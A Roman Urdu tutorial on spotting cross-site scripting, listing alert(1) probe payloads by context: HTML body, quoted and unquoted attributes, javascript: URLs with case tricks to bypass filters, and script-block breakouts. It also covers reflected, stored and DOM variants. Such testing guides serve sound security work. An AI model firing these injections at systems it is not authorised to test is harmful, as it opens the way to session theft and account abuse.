Kisi parameter ya input field par yeh check karne ke liye ke **XSS exist karti hai ya nahi**, sabse pehle **Reflection & Context Detection Payloads** use kiye jaate hain—taake pata chale tumhara input response mein kahan aur kaise aa raha hai.

### 1. Canary / Reflection Probes (Sabse Pehla Step)
Pehle yeh dekho ke tumhara input page ke source ya response mein **reflect** bhi ho raha hai ya nahi, aur special characters (<, >, ", ') encode ho rahe hain ya raw aa rahe hain:
 * habibxss123 (ya koi unique string taake aasani se source mein search ho sake)
 * "'<>
 * xss"test'tag<>
**Rule:** Agar response mein < ya > raw nazar aaye (ya &lt; / &gt; ke bajaye directly print ho), to XSS ka pehla signal milta hai.
### 2. HTML Body Context Probes
Agar input HTML tag ke bahar ya andar text ki tarah aa raha hai:
 * <script>alert(1)</script>
 * <img src=x onerror=alert(1)>
 * <svg onload=alert(1)>
 * <body onload=alert(1)>
 * <details open ontoggle=alert(1)>
**Rule:** Agar tag inject ho jaye aur alert(1) (ya console.log(1)) execute ho, to HTML context mein XSS confirm hai.
### 3. HTML Attribute Context Probes
Agar input kisi attribute ke andar ja raha hai, jaise <input value="INPUT"> ya <a href="INPUT">:
 * **Double-quote attribute ("..."):**
   * "><script>alert(1)</script>
   * " autofocus onfocus=alert(1) x="
   * " onmouseover=alert(1) x="
 * **Single-quote attribute ('...'):**
   * '><script>alert(1)</script>
   * ' autofocus onfocus=alert(1) x='
   * ' onmouseover=alert(1) x='
 * **Unquoted attribute (value=INPUT):**
   * x onmouseover=alert(1)
   * x autofocus onfocus=alert(1)
**Rule:** Agar attribute quote break ho kar naya attribute (onfocus, onerror, onmouseover) ya naya tag ban jaye, to execution ka chance banta hai.
### 4. URL / href / src Context Probes
Agar input link ya resource URL mein ja raha hai:
 * javascript:alert(1)
 * javascript:alert(1) (leading spaces/tabs kabhi kabhi filter bypass kar dete hain)
 * JaVaScRiPt:alert(1)
### 5. JavaScript / Script Block Context Probes
Agar input pehle se kisi <script> tag ya inline JS variable ke andar ja raha hai:
 * ';alert(1);//
 * ";alert(1);//
 * </script><script>alert(1)</script>
 * '-alert(1)-'
### 6. Detection Ke Waqt Zaroori Baatein
 * **Context Sab Se Zaroori Hai:** Har jagah <script>alert(1)</script> nahi chalta—agar input <input value="HERE"> mein ja raha hai to pehle " se attribute todna parega.
 * **Source Code Dekhna Na Bhoolo:** Sirf browser screen nahi, **View Page Source** ya **Inspect Element** mein dekho ke tumhara input kahan ja kar baitha hai.
 * **alert(1) vs Real Impact:** Testing mein alert(1) ya console.log(1) sirf proof-of-concept ke liye hota hai; asal impact session/token theft, unauthorized actions, ya phishing waghera se samjha jata hai.
 * **Stored vs Reflected vs DOM:** Agar payload foran usi response mein aaye to **Reflected**, DB mein save ho kar baqi users/pages par chale to **Stored**, aur JS ke zariye client-side sink mein jaye to **DOM-based** XSS hoti hai.
